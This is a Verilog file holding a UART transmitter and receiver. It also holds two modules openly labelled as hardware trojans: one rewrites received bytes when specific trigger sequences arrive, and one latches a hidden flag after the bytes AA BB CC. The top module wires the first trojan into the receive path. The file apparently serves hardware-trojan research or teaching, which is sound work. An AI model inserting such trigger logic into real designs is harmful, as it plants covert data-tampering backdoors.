`timescale 1ns/1ps
module uart_tx #(
    parameter CLKS_PER_BIT = 5208
)
(
    input clk,reset,tx_start,
    input [7:0] tx_data,
    output reg tx,tx_busy,tx_done
);

    localparam IDLE  = 2'd0,
               START = 2'd1,
               DATA  = 2'd2,
               STOP  = 2'd3;

  reg [1:0] state;// size is 2^(i+1) not 2^i
    reg [15:0] clk_count;
    reg [2:0] bit_index;
    reg [7:0] tx_shift;

  always @(posedge clk or negedge reset) begin // falling from 1 to 0 waveform then we execute this
        if (!reset) begin
          // No = only <= Non blocking only
            state     <= IDLE;
            tx         <= 1'b1;
            tx_busy    <= 1'b0;
            tx_done    <= 1'b0;
            clk_count  <= 0;
            bit_index  <= 0;
            tx_shift   <= 0;
        end
        else begin
            tx_done <= 1'b0;
          case (state) // switch case of verilog
                IDLE: begin
                    tx        <= 1'b1;
                    tx_busy   <= 1'b0;
                    clk_count <= 0;
                    bit_index <= 0;

                    if (tx_start) begin
                        tx_shift <= tx_data;
                        tx       <= 1'b0;
                        tx_busy  <= 1'b1;
                        state    <= START;
                    end
                end

                START: begin // go from 0 to 5207 fir execute  so one clock cycle
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        bit_index <= 0;
                        tx        <= tx_shift[0];
                        state     <= DATA;
                    end
                    else
                      clk_count <= clk_count + 1;// multiple line begin end is like brackets signle line no need
                end

                DATA: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                      if (bit_index == 7) begin // 7 not 8 bit_index+1 segmentation error
                      tx    <= 1'b1;
                      state <= STOP;
                        end
                        else begin
                         bit_index <= bit_index + 1;
                            tx <= tx_shift[bit_index + 1];
                        end
                    end
                    else
                        clk_count <= clk_count + 1;
                end
                STOP: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        tx_done   <= 1'b1;
                        tx_busy   <= 1'b0;
                        state     <= IDLE;
                    end
                    else
                        clk_count <= clk_count + 1;
                end
                default: state <= IDLE;
            endcase
        		 end
    		end

endmodule


module uart_rx #(
    parameter CLKS_PER_BIT = 5208
)(
    input clk,reset,rx,
    output reg [7:0] rx_data,
    output reg rx_valid,rx_busy,rx_error
);

    localparam IDLE  = 2'd0,
               START = 2'd1,
               DATA  = 2'd2,
               STOP  = 2'd3;

    reg [1:0] state;
    reg [15:0] clk_count;
    reg [2:0] bit_index;
    reg [7:0] rx_shift;

    reg rx_sync1, rx_sync2;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            rx_sync1 <= 1'b1;
            rx_sync2 <= 1'b1;
        end
        else begin
            rx_sync1 <= rx;
            rx_sync2 <= rx_sync1; // <= not = need parallel assignment otherwise we get new value instead of old
        end
    	end

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            state     <= IDLE;
            clk_count <= 0;
            bit_index <= 0;
            rx_shift  <= 0;
            rx_data   <= 0;
            rx_valid  <= 0;
            rx_busy   <= 0;
            rx_error  <= 0;
        end
        else begin
            rx_valid <= 1'b0;
            rx_error <= 1'b0;

            case (state)
         	IDLE: begin
                 rx_busy   <= 1'b0;
                 clk_count <= 0;
                 bit_index <= 0;

                 if (rx_sync2 == 1'b0) begin
                    rx_busy <= 1'b1;
                    state   <= START;
                    end
                	end

                START: begin
                    
                  if (clk_count == (CLKS_PER_BIT - 1)/2) // mid value needed here or edge issues
                      begin
                        clk_count <= 0;

                    if (rx_sync2 == 1'b0)
                            state <= DATA;
                  else begin
                       state    <= IDLE;
                            rx_error <= 1'b1;
                        end
                    end
                    else
                        clk_count <= clk_count + 1;
                end

                DATA: begin
                  if (clk_count == CLKS_PER_BIT - 1) // no /2 needed here this is after verification /2 frequency issue
                      begin
                        clk_count <= 0;
                      rx_shift[bit_index] <= rx_sync2; // bit_index not bit_index+! here

                        if (bit_index == 7)
                            state <= STOP;
                        else
                            bit_index <= bit_index + 1;
                    end
                    else
                        clk_count <= clk_count + 1;
                end

                STOP: begin
                  if (clk_count == CLKS_PER_BIT - 1)
                      begin
                        clk_count <= 0;
                        rx_busy   <= 1'b0;
                        state     <= IDLE;

                        if (rx_sync2 == 1'b1) // valididty check
                          begin
                            rx_data  <= rx_shift;
                            rx_valid <= 1'b1;
                        end
                      
                        else begin
                            rx_error <= 1'b1;
                        end
                    end
                    else
                        clk_count <= clk_count + 1;
                end

                default: state <= IDLE;

            endcase
        	end
    	end

endmodule


// ============================================================
// PARAMETERIZED TROJAN
// ============================================================


module uart_trojan #(
    parameter [7:0] TROJAN_SINGLE_INPUT  = 8'd94,
    parameter [7:0] TROJAN_SINGLE_OUTPUT = 8'd95,

    parameter [7:0] TROJAN_TWO_FIRST     = 8'd36,
    parameter [7:0] TROJAN_TWO_SECOND    = 8'd37,
    parameter [7:0] TROJAN_TWO_OUTPUT    = 8'd38,

    parameter [7:0] TROJAN_FOUR_FIRST    = 8'd5,
    parameter [7:0] TROJAN_FOUR_SECOND   = 8'd27,
    parameter [7:0] TROJAN_FOUR_THIRD    = 8'd49,
    parameter [7:0] TROJAN_FOUR_FOURTH   = 8'd21,
    parameter [7:0] TROJAN_FOUR_OUTPUT   = 8'd22
)(
    input clk,
    input reset,

    input [7:0] rx_data_in,
    input rx_valid_in,

    output reg [7:0] rx_data_out,
    output reg rx_valid_out
);

    localparam IDLE       = 3'd0,
               TWO_FIRST  = 3'd1,
               FOUR_FIRST = 3'd2,
               FOUR_SECOND = 3'd3,
               FOUR_THIRD = 3'd4;

    reg [2:0] state;

    reg [7:0] prev1;
    reg [7:0] prev2;
    reg [7:0] prev3;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            state        <= IDLE;
            prev1        <= 8'd0;
            prev2        <= 8'd0;
            prev3        <= 8'd0;
            rx_data_out  <= 8'd0;
            rx_valid_out <= 1'b0;
        end
        else begin
            rx_valid_out <= rx_valid_in;

            if (rx_valid_in) begin

                case (state)

                    // ========================================
                    // IDLE: Check single-byte and first bytes
                    // ========================================

                    IDLE: begin

                        if (rx_data_in == TROJAN_SINGLE_INPUT) begin
                            rx_data_out <= TROJAN_SINGLE_OUTPUT;
                        end
                        else begin
                            rx_data_out <= rx_data_in;
                        end

                        if (rx_data_in == TROJAN_TWO_FIRST)
                            state <= TWO_FIRST;

                        else if (rx_data_in == TROJAN_FOUR_FIRST)
                            state <= FOUR_FIRST;

                        else
                            state <= IDLE;

                    end

                    // ========================================
                    // TWO-BYTE SEQUENCE
                    // FIRST -> SECOND
                    // ========================================

                    TWO_FIRST: begin

                        if (rx_data_in == TROJAN_TWO_SECOND)
                            rx_data_out <= TROJAN_TWO_OUTPUT;
                        else
                            rx_data_out <= rx_data_in;

                        if (rx_data_in == TROJAN_FOUR_FIRST)
                            state <= FOUR_FIRST;
                        else if (rx_data_in == TROJAN_TWO_FIRST)
                            state <= TWO_FIRST;
                        else
                            state <= IDLE;

                    end

                    // ========================================
                    // FOUR-BYTE SEQUENCE
                    // FIRST -> SECOND -> THIRD -> FOURTH
                    // ========================================

                    FOUR_FIRST: begin

                        rx_data_out <= rx_data_in;

                        if (rx_data_in == TROJAN_FOUR_SECOND)
                            state <= FOUR_SECOND;
                        else if (rx_data_in == TROJAN_FOUR_FIRST)
                            state <= FOUR_FIRST;
                        else if (rx_data_in == TROJAN_TWO_FIRST)
                            state <= TWO_FIRST;
                        else
                            state <= IDLE;

                    end

                    FOUR_SECOND: begin

                        rx_data_out <= rx_data_in;

                        if (rx_data_in == TROJAN_FOUR_THIRD)
                            state <= FOUR_THIRD;
                        else if (rx_data_in == TROJAN_FOUR_FIRST)
                            state <= FOUR_FIRST;
                        else if (rx_data_in == TROJAN_TWO_FIRST)
                            state <= TWO_FIRST;
                        else
                            state <= IDLE;

                    end

                    FOUR_THIRD: begin

                        if (rx_data_in == TROJAN_FOUR_FOURTH)
                            rx_data_out <= TROJAN_FOUR_OUTPUT;
                        else
                            rx_data_out <= rx_data_in;

                        if (rx_data_in == TROJAN_FOUR_FIRST)
                            state <= FOUR_FIRST;
                        else if (rx_data_in == TROJAN_TWO_FIRST)
                            state <= TWO_FIRST;
                        else
                            state <= IDLE;

                    end

                    default: begin
                        state <= IDLE;
                        rx_data_out <= rx_data_in;
                    end

                endcase

                // ========================================
                // Track ORIGINAL received bytes
                // ========================================

                prev3 <= prev2;
                prev2 <= prev1;
                prev1 <= rx_data_in;

            end
        end
    end

endmodule
module side_effect_trojan (
    input clk,
    input reset,
    input [7:0] rx_data_in,
    input rx_valid_in,
    output reg trojan_side_effect
);

    localparam IDLE   = 2'd0,
               GOT_AA = 2'd1,
               GOT_BB = 2'd2,
               ACTIVE = 2'd3;

    reg [1:0] state;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            state <= IDLE;
            trojan_side_effect <= 1'b0;
        end
        else begin
            if (rx_valid_in) begin
                case (state)

                    IDLE: begin
                        if (rx_data_in == 8'hAA)
                            state <= GOT_AA;
                    end

                    GOT_AA: begin
                        if (rx_data_in == 8'hBB)
                            state <= GOT_BB;
                        else if (rx_data_in == 8'hAA)
                            state <= GOT_AA;
                        else
                            state <= IDLE;
                    end

                    GOT_BB: begin
                        if (rx_data_in == 8'hCC) begin
                            state <= ACTIVE;
                            trojan_side_effect <= 1'b1;
                        end
                        else if (rx_data_in == 8'hAA)
                            state <= GOT_AA;
                        else
                            state <= IDLE;
                    end

                    ACTIVE: begin
                        state <= ACTIVE;
                    end

                    default: state <= IDLE;

                endcase
            end
        end
    end

endmodule



module uart_top #(
    parameter CLKS_PER_BIT = 5208,

    parameter [7:0] TROJAN_SINGLE_INPUT  = 8'd94,
    parameter [7:0] TROJAN_SINGLE_OUTPUT = 8'd95,

    parameter [7:0] TROJAN_TWO_FIRST     = 8'd36,
    parameter [7:0] TROJAN_TWO_SECOND    = 8'd37,
    parameter [7:0] TROJAN_TWO_OUTPUT    = 8'd38,

    parameter [7:0] TROJAN_FOUR_FIRST    = 8'd5,
    parameter [7:0] TROJAN_FOUR_SECOND   = 8'd27,
    parameter [7:0] TROJAN_FOUR_THIRD    = 8'd49,
    parameter [7:0] TROJAN_FOUR_FOURTH   = 8'd21,
    parameter [7:0] TROJAN_FOUR_OUTPUT   = 8'd22
)(
    input clk,
    input reset,
    input tx_start,
    input rx,
    input [7:0] tx_data,

    output tx,
    output tx_busy,
    output tx_done,

    output rx_valid,
    output rx_busy,
    output rx_error,
    output [7:0] rx_data
);

    wire [7:0] raw_rx_data;
    wire raw_rx_valid;

    uart_tx #(
        .CLKS_PER_BIT(CLKS_PER_BIT)
    ) transmitter (
        .clk(clk),
        .reset(reset),
        .tx_start(tx_start),
        .tx_data(tx_data),
        .tx(tx),
        .tx_busy(tx_busy),
        .tx_done(tx_done)
    );

    uart_rx #(
        .CLKS_PER_BIT(CLKS_PER_BIT)
    ) receiver (
        .clk(clk),
        .reset(reset),
        .rx(rx),
        .rx_data(raw_rx_data),
        .rx_valid(raw_rx_valid),
        .rx_busy(rx_busy),
        .rx_error(rx_error)
    );

    uart_trojan #(
        .TROJAN_SINGLE_INPUT(TROJAN_SINGLE_INPUT),
        .TROJAN_SINGLE_OUTPUT(TROJAN_SINGLE_OUTPUT),

        .TROJAN_TWO_FIRST(TROJAN_TWO_FIRST),
        .TROJAN_TWO_SECOND(TROJAN_TWO_SECOND),
        .TROJAN_TWO_OUTPUT(TROJAN_TWO_OUTPUT),

        .TROJAN_FOUR_FIRST(TROJAN_FOUR_FIRST),
        .TROJAN_FOUR_SECOND(TROJAN_FOUR_SECOND),
        .TROJAN_FOUR_THIRD(TROJAN_FOUR_THIRD),
        .TROJAN_FOUR_FOURTH(TROJAN_FOUR_FOURTH),
        .TROJAN_FOUR_OUTPUT(TROJAN_FOUR_OUTPUT)
    ) trojan (
        .clk(clk),
        .reset(reset),
        .rx_data_in(raw_rx_data),
        .rx_valid_in(raw_rx_valid),
        .rx_data_out(rx_data),
        .rx_valid_out(rx_valid)
    );

endmodule